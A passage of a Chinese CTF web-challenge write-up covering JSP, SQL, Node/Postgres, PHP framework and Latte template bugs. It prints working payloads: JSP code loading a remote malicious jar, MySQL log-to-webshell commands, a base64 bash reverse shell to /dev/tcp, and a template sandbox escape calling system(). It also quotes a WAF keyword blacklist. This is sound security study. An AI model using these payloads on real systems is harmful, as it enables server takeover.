+<%@ page import="java.util.ServiceLoader" %>
+<%@ page import="java.net.URLClassLoader" %>
+<%@ page import="java.net.URL" %>
+<% class clazz="Class.forName("javax.script.ScriptEng"+"ineFactory");" iterator serviceloader="ServiceLoader.load(clazz," new urlclassloader(new url[]{new url("http: ip:port evil.jar")})).iterator(); while (serviceloader.hasnext()){ serviceloader.next(); } %>
+</%></%@></%@></%@></%@></%@></code></pre>
+<p>顺便还附了一个jsp马的GitHub项目链接<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/threedr3am/JSP-Webshells">https://github.com/threedr3am/JSP-Webshells</a></p>
+<h4 id="update-1"><a href="#update-1" class="headerlink" title="update"></a>update</h4><p>看了官方wp，这里的UTF-16编码绕过，实际上是利用了处理时使用的类和tomcat解析时的编码不一致导致的绕过</p>
+<blockquote>
+<p>FileItem.getString()对于编码的解析跟Tomcat解析jsp是有差异的，默认为<br>ISO-8859-1<br>而Tomcat对于jsp编码的解析主要在org.apache.jasper.compiler.EncodingDetector这个类，其中有很<br>多默认用ISO-8859-1无法直接解析的编码。</p>
+</blockquote>
+<p>作者提到，在tomcat支持的编码中，有许多是ISO-8859-1不能直接解析的，除了大家都爱的UTF-16外，还有UCS-4和CP037等编码<br>而如果waf进行了超级内容过滤，只要他不支持这种编码的解析，就能随意绕过</p>
+<p>也看到了过滤的黑名单，也可以从这个黑名单中去学习RCE的思路</p>
+<pre class=" language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> blackWordsList <span class="token operator">=</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//危险关键字</span>
+    <span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token string">"Runtime"</span><span class="token punctuation">,</span> <span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token string">"ProcessBuilder"</span><span class="token punctuation">,</span>
+    <span class="token string">"loadClass"</span><span class="token punctuation">,</span> <span class="token string">"ScriptEngine"</span><span class="token punctuation">,</span>
+    <span class="token string">"setAccessible"</span><span class="token punctuation">,</span> <span class="token string">"JdbcRowSetImpl"</span><span class="token punctuation">,</span> <span class="token string">"ELProcessor"</span><span class="token punctuation">,</span>
+    <span class="token string">"ELManager"</span><span class="token punctuation">,</span> <span class="token string">"TemplatesImpl"</span><span class="token punctuation">,</span> <span class="token string">"lookup"</span><span class="token punctuation">,</span>
+    <span class="token string">"readObject"</span><span class="token punctuation">,</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true">//写⽂件</span>
+    <span class="token string">"File"</span><span class="token punctuation">,</span> <span class="token string">"Writer"</span><span class="token punctuation">,</span> <span class="token string">"Stream"</span><span class="token punctuation">,</span> <span class="token string">"commons"</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true">//request</span>
+    <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"Request"</span><span class="token punctuation">,</span>
+    <span class="token comment" spellcheck="true">//特殊编码也处理⼀下</span>
+    <span class="token string">"\\u"</span><span class="token punctuation">,</span> <span class="token string">"CDATA"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#"</span>
+    <span class="token comment" spellcheck="true">//这下总安全了吧</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre>
+<p>invoke,setAccessible这些都是经典反射操作，JdbcRowSetImpl和lookup则是jndi注入操作（出题人说为了降低难度选择了较低版本的jdk，所以还能用jndi注入打），Runtime和ProcessBuilder经典直接命令执行，而defineClass，TemplateImpl，newInstance都是从字节码中还原类，实例化之类的。顺便禁用了文件读写防止写入文件二次绕过（这里把\u给ban了感觉写入文件也没用？）还有一些ScriptEngine，ELProcessor，ELManager就是我没见过的知识了</p>
+<p>还有用URLClassloader直接加载远程类rce的，对不起我真的是java废物<br>Class.forName方法第二个参数指定是否初始化类，直接初始化就能触发恶意类在static中的代码段，从而实现RCE</p>
+<pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.URL"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.URLClassLoader"</span> <span class="token operator">%</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">%</span>
+    URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://ip/rce.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    URLClassLoader ucl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>url<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.test.rce"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">,</span>ucl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token operator">%</span><span class="token operator">></span>
+</code></pre>
+<p>抄的这边，tqltql<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://y4tacker.blog.csdn.net/article/details/121363886">[2021XCTF]L3HCTF-Writeup(Web)</a></p>
+<p>出题人为了简单起见出了网，但同时也提到了不出网情况下的利用方案，利用bcel ClassLoader绕过，这个操作看起来感觉和那种用bytecode来defineClass并实例化有点像</p>
+<blockquote>
+<p>bcel字节码webshell的原理在于com.sun.org.apache.bcel.internal.util.ClassLoader在loadClass的时<br>候会解析并加载bcel字节码</p>
+</blockquote>
+<p>虽然ban了loadClass，但forName实际上是会去调用loadClass，之前学那个tomcat的buggyloader的时候就学过这一点</p>
+<p>这个bcel操作暂时没学，先码着payload，也是这个师傅的各种jsp马中的一个，tqltql，再膜一下<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/1/BcelEvil.java">threedr3am&#x2F;JSP-Webshells</a></p>
+<p>也许改天可以把这个库过一下来学习各种java RCE方式？</p>
+<h2 id="深育"><a href="#深育" class="headerlink" title="深育"></a>深育</h2><p>这个比赛就当初完全没看见，就没报名，结束了之后看了看wp，发现好像题出的还挺好的，有好几个没见过的知识点，所以也就就着wp复现一下</p>
+<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>在secure-file-priv配置不能写文件的情况下，利用日志文件getshell的操作，当然，还是要有对应文件写权限的<br>虽然看wp后面有很奇怪的操作，找用户然后在用户home目录翻到了ssh.log，flag在那个里面。。。但总归前面半边的操作还是比较合理的。开个mysql试验一下</p>
+<p>MySQL的日志分为错误日志，通用日志，更新日志（已弃用），二进制日志，慢查询日志和InnoDB日志。<br>常用的应该是通用日志和慢查询日志getshell，但通用日志记录所有的访问内容，很容易因为过大导致服务器500，所以慢查询日志比较常用<br>看起来能用的错误日志，只能在mysql启动的时候通过配置文件或者命令行参数指定，如果尝试在启动后进行修改，会报一个只读的错我<br><code>ERROR 1238 (HY000): Variable &#39;log_error&#39; is a read only variable</code></p>
+<p>使用如下命令进行慢查询日志的配置（攻击时需要能够堆叠注入）</p>
+<pre class=" language-mysql"><code class="language-mysql">show variables like '%slow_query_log%'
+set global slow_query_log=1;
+set global slow_query_log_file='/var/www/html/shell.php';
+</code></pre>
+<p>慢日志只记录查询时间超过<code>long_query_time</code>的语句，可以直接sleep之类的来使其超时，比如<code>select &#39;&lt;?php phpinfo();?&gt;&#39;,sleep(10);</code>，限制条件下也可以用一些耗时计算语句来消磨时间<br>当然，这样效率较为低下，可以直接设置<code>long_query_time</code>这个变量为0.000001，mysql允许的最小时间进度？这样子所有的查询就都会被记录了。<br>对于通用日志，所需设置的变量为<code>general_log general_log_file</code></p>
+<h3 id="FakeWget"><a href="#FakeWget" class="headerlink" title="FakeWget"></a>FakeWget</h3><p>感觉不算太难的一个题，wget的命令注入，通过fuzz的方法找过滤情况，然后用wget的http_proxy和body-file参数外带文件。<br>最后又是读passwd找用户。。。找到用户后读.bash_history找到程序根目录，读取flag</p>
+<h3 id="EasyWAF"><a href="#EasyWAF" class="headerlink" title="EasyWAF"></a>EasyWAF</h3><p>这个题要我做估计是做不出来了。。。<br>所有的hint靠cookie给出，这个就有一点脑洞。。。<br>有关waf的提示是max_allowed_packet，而SQL注入的提示是node-postgres<br>所以是用max_allowed_packet过waf，再用node配合postgresql的洞rce(我还真没听说过这个洞)<br>先看max_allowed_packet，这个是MySQL设置的服务端接受的最大的数据包的大小，看了下默认值为67108864，感觉应该是在64M左右，只要发过去的查询语句大于64M，MySQL就会拒绝这个包，也就能绕过waf了？暂时没有很理解把查询语句放到数据库里比对的waf是怎么工作的</p>
+<p>node+postgresql的洞有点远古，不过搜一下倒是很容易搜到，这里就有一篇p神的文章(17年的。。。)<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">node.js + postgres 从注入到Getshell</a><br>漏洞的大体成因为node将查询的返回值中的字段名拼了起来，并将结果传入了Function类构造函数的第三个参数，也就是函数体，而防止字段逃逸的措施只是将<code>&#39;</code>变为<code>\&#39;</code>，这样子的话只要我们本身传入一个<code>\&#39;</code>，那么得到的结果就是<code>\\&#39;</code>，直接逃逸进行命令执行</p>
+<p>不过对于<code>SELECT username,password from users where id=</code>这种注入语句，字段名语句被固定为了username和password，是无法更改的，所以要使用堆叠注入，直接新加一条语句来创建我们自己的字段</p>
+<p>至于实战利用，没开环境试了，直接抄p神的结论</p>
+<blockquote>
+<p>单双引号都不能正常使用，我们可以使用es6中的反引号<br>Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。<br>一个fieldName只能有64位长度，所以我们通过多个fieldName拼接来完成利用</p>
+</blockquote>
+<pre><code>SELECT 1 AS &quot;\&#39;]=0;require=process.mainModule.constructor._load;/*&quot;, 2 AS &quot;*/p=require(`child_process`);/*&quot;, 3 AS &quot;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&quot;, 4 AS &quot;*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//&quot;
+</code></pre>
+<p>这个payload挺巧妙的，把多个字段拼接起来，并且每个字段之间还要内联注释闭合，这样子字段间就算分开，也不怕中间出现奇怪的数据干扰</p>
+<h3 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h3><p>首先是一个任意文件下载，通过下载给的日志路径下当天的日志，获取jar包名称，下载jar包反编译，看pom是一个有common-beanutils但无CC的环境<br>我直接联想p神的另一篇文章<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutils与无commons-collections的Shiro反序列化利用</a><br>利用Commons Beanutils中的BeanComparator，直接触发templateImpl的getOutputProperties</p>
+<p>wp中将templateImpl的bytecode换成了tomcat回显的版本，不知道能不能直接弹shell出来，还是说经典不通外网？</p>
+<h3 id="ZIPZIP"><a href="#ZIPZIP" class="headerlink" title="ZIPZIP"></a>ZIPZIP</h3><p>这个题感觉很有意思，和之前HCTF那个经典zip解压软链接有的一拼，不过那个题是软链接任意文件读，这个是软链接任意文件写。思路倒是很简单，但是说实话不一定想得出来</p>
+<p>功能也就是解压压缩包，操作就是先传一个压缩包，里面塞一个软链接，比如叫test，软链接指向&#x2F;var&#x2F;www&#x2F;html&#x2F;这个目录，第二次再传一个压缩包，压缩包内容是test目录，目录下塞一个shell.php，这样子在解压的时候就会把shell通过之前传的test软链接写到&#x2F;var&#x2F;www&#x2F;html目录下<br>（就这么打字说着感觉好不带劲哦）</p>
+<h2 id="湖湘"><a href="#湖湘" class="headerlink" title="湖湘"></a>湖湘</h2><p>湖湘杯，好像三个web就做出来一个最简单的<br>java那个题，给了pom.xml，但是进去之后我连接口有哪些都不知道，虽然看pom应该是先经典shiro越权进去，但是，越哪个路由的权呢？<br>还有一个究极xss，出题人一开始把源码藏着，最后个把小时放出来了，看了一下发现admin的处理逻辑都和普通用户不一样，不过就算有源码也做不出来，感觉是要注册一个service worker去打，到时候有空再研究一下</p>
+<h3 id="willphp"><a href="#willphp" class="headerlink" title="willphp"></a>willphp</h3><p>一个上古上古上古框架，说是套着tp改的，实际上感觉没什么相同点，就是也是MVC框架罢了。给了个indexController的源码，但是页面上有写版本，直接下一份源码下来看<br>index代码没写啥，就调用了一个assign，然后调用了view<br>直接找他源码里调用的assign和view函数，assign就是把view类的<code>$_vars</code>数组进行键值对的赋值，而views最后会调用到renderTo函数，长这样</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">renderTo</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">,</span> <span class="token variable">$_vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">__MODULE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'jump.html'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-jump.html.php'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token constant">PATH_VIEWC</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$cfile</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$strs</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">comp</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$vfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$_vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">,</span> <span class="token variable">$strs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$cfile</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>vars就是我们之前可控的那个变量，然后这里<code>extract($_vars);include $cfile;</code>，一个超级明显的变量覆盖+文件包含</p>
+<p>用经典upload progress打通，不过这里环境怪怪的，本来比较稳妥的做法是upload progress写文件，再稳定包含写的文件，但不知道为什么就是写不进去，我还以为不能打，最后直接执行命令反而成功了</p>
+<h2 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h2><p>高强度坐牢。改天也得联系一下CMS的审计，这把有一个人写的rainrock还是什么框架，实属给我看懵了，全程拼音加缩写命名，并且感觉代码结构和常见的tp也有点出入。。。呜呜呜</p>
+<h3 id="灏妹的web"><a href="#灏妹的web" class="headerlink" title="灏妹的web"></a>灏妹的web</h3><p>就是敏感信息泄露吧，整了个index.php路由，还返回一个x-powered-by的PHP头<br>扫目录，但是扫啥都200，但是又没内容，然后用眼睛硬看，看见一个<code>.idea/workspace.xml</code>，是用jetbrain家的东西写的，翻了翻idea其他相关内容，jre都出现了，java写的。。。然后搜GitHub发现了一个idea目录的利用脚本，说是能扫敏感信息，扫了一下屁用没有。然后另一个师傅可能看的比较仔细，或者dirsearch比较高级，扫出来了一个dataSource.xml，flag直接在里面</p>
+<h3 id="EZupload"><a href="#EZupload" class="headerlink" title="EZupload"></a>EZupload</h3><p>打latte这个PHP渲染引擎，说起来，这个引擎在文档上表现的非常安全，以及他们自己也说他们是注重安全的模板引擎，提供了一系列的安全解决方案。。。确实就从这个角度上看挺安全的，说实话，我觉得挖个这个洞还蛮有意思的，能想出来应该也很强吧</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">require</span> <span class="token string">'vendor/autoload.php'</span><span class="token punctuation">;</span>
+<span class="token variable">$latte</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Latte<span class="token punctuation">\</span>Engine</span><span class="token punctuation">;</span>
+<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setTempDirectory</span><span class="token punctuation">(</span><span class="token string">'tempdir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$policy</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Latte<span class="token punctuation">\</span>Sandbox<span class="token punctuation">\</span>SecurityPolicy</span><span class="token punctuation">;</span>
+<span class="token variable">$policy</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">allowMacros</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'else'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$policy</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">allowFilters</span><span class="token punctuation">(</span><span class="token variable">$policy</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$policy</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">allowFunctions</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'trim'</span><span class="token punctuation">,</span> <span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setPolicy</span><span class="token punctuation">(</span><span class="token variable">$policy</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setSandboxMode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$latte</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAutoRefresh</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$file_conents</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">28</span> <span class="token keyword">or</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file_conents</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>基本上就是文档里默认推荐的保护策略全开，还限制了文件名和内容，关了setAutoRefresh，题目只渲染index.latte，两分钟重置一次环境，就得等环境重置之后直接上传，防止其渲染默认模板之后打不了。</p>
+<p>这个模板简单试了一下，渲染的时候会直接生成一个index.latte–xxxxx.php的文件，<code>&#123;expr&#125;</code>里的expr会直接作为参数传入一个escapeHtmlText函数，大概长这样<br><code>echo LR\Filters::escapeHtmlText(expr) /* line 1 */;</code><br>模板外的内容会直接用单引号包裹起来echo出来，并且都做了充分的转义，<code>// #</code>这两个注释符被禁用了，反引号也不给用</p>
+<p>一开始发现<code>/*</code>是可以用的，并且似乎成功注释掉了后面的括号并逃逸了出去。。。然后无论如何都闭合不回来了，他的括号一定要成对，而一旦成对就会觉得你在调用函数，一是过不了黑名单，二是成对也没法闭合，放在字符串里的括号也会被正确的解析不能拿来闭合。一开始从这就跑偏了，到最后都没做出来呜呜</p>
+<p>赛后看wp来研究这个模板引擎，这个模板的会对输入内容进行语法分析，基本上就是直接把整个表达式的内容进行一个eval，但对形如<code>$a($b)</code>这种的动态调用都会被当做函数调用解析，被改写为<code>$this-&gt;call($a)($b)</code>的形式并在call函数内被安全策略检查，不过双引号包裹的内容似乎会直接被复制粘贴过来。<br>但直接<code>&#123;&quot;expr&quot;&#125;</code>的话，解析引擎就不把这个内容当做模板，而是直接连引号带大括号的直接echo出来了</p>
+<p>然后就有师傅发现了他还有一个<code>&#123;=expr&#125;</code>的模板语法，这个语法和<code>&#123;expr&#125;</code>并无区别，但允许expr开头不是变量或函数，就允许开头是字符串了，然后再用双引号字符串内的变量可以被解析进行动态调用<br>payload<br><code>&#123;=&quot;$&#123;system($_GET[1])&#125;&quot;&#125;</code><br>我一开始非常愚蠢的试了试<code>&#123;=&quot;$_GET[1]($_GET[2])&quot;&#125;</code>，还在想为什么这样子不成功。。。。后来才意识到这里的括号可没有其他的语义，双引号内只是解析变量罢了，硬是要解析的话可以再套一层<code>&#123;=&quot;$&#123;$_GET[1]($_GET[2])&#125;&quot;&#125;</code></p>
+<h4 id="额外测试"><a href="#额外测试" class="headerlink" title="额外测试"></a>额外测试</h4><p>额外做了些无聊的测试，因为这个绕过的原因在于该模板引擎对字符串内的内容不做处理，而双引号字符串内的内容可以被解析造成的。一定要用<code>&#123;=expr&#125;</code>这个形式吗，倒也不一定，<code>&#123;expr&#125;</code>不能用是因为如果表达式的开头不是变量或函数，整个字符串就不会被当做模板去渲染，所以开头随便定义个变量，或者随便调用个函数，再拼接一个双引号字符串上去，一样能打通。<br>例如<code>&#123;$a.&quot;$&#123;$_GET[1]($_GET[2])&#125;&quot;&#125;</code>也是可以的</p>
+<h3 id="OA-RCE"><a href="#OA-RCE" class="headerlink" title="OA?RCE?"></a>OA?RCE?</h3><p>今天闲下来之后决定再认真看一下，起码要简单的能够对框架类代码进行阅读，然后给我读麻了，我觉得这个哥哥能写出来这么大一堆垃圾就证明应该也有点能力，为什么要用拼音究极命名呢，各种拼音缩写，是在代码命名层面对代码进行混淆吗。给我看麻了</p>
+<p>网上还能搜到两个对应的RCE，不过不知道还能不能打<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/articles/web/286380.html">通读审计之信呼OA</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://422926799.github.io/posts/3541f020.html">信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</a></p>
+<p>这个破烂框架最有意思的是还在持续更新，前两天又发布了一版更新。大无语事件，能不能把变量名和函数名之类的起规范一点？</p>
+<p>直接看别人的wp是怎么打的<br>在View.php的末尾理论上是在进行模板的渲染，直接include了一个文件<br><code>include_once($mpathname);</code><br>这个变量可以通过如下方式赋值<br><code>if($xhrock-&gt;displayfile!=&#39;&#39; &amp;&amp; file_exists($xhrock-&gt;displayfile))$mpathname = $xhrock-&gt;displayfile</code><br>$xhrock是一个Action类，全局搜索displayfile这个变量，找到在两个action类中进行赋值<br>一个是index&#x2F;indexAction的getshtmlAction方法，能够include任意PHP文件<br>另一个是task&#x2F;mode&#x2F;modeAction的defaultAction方法，能够include任意HTML文件<br>显然是任意PHP文件比较靠谱，在裸文件包含且限定后缀的情况下，打一个pearcmd进行任意文件写，写一个shell之后再进行包含</p>
+<p>至于怎么调用这个方法，就需要自行阅读一下某些垃圾代码了，mpda几个参数对应module project directory action</p>
+<h2 id="N1"><a href="#N1" class="headerlink" title="N1"></a>N1</h2><p>Null的题目，好像也不是特别难嘛.jpg。反正我就签了个到</p>
+<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>文档题，控制了一堆东西，总之就是输入一个数据，这个数据用date函数处理过之后得到的内容作为文件名去读<br>翻一下PHP manual就能知道，date运行输入普通字符串，在前面加个斜线转义即可<br><code>\/\f\l\a\g</code></p>
+<h3 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h3><p>给了个hint说环境不是用docker起的，暂且未理解这个hint的意思，一个带过滤加escapeshellarg的curl</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//hint in /hint.txt</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$uuid</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
+        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
+        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
+        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span>
+        <span class="token punctuation">.</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$uuid</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string">"/l|g|[\x01-\x1f]|[\x7f-\xff]|['\"]/i"</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
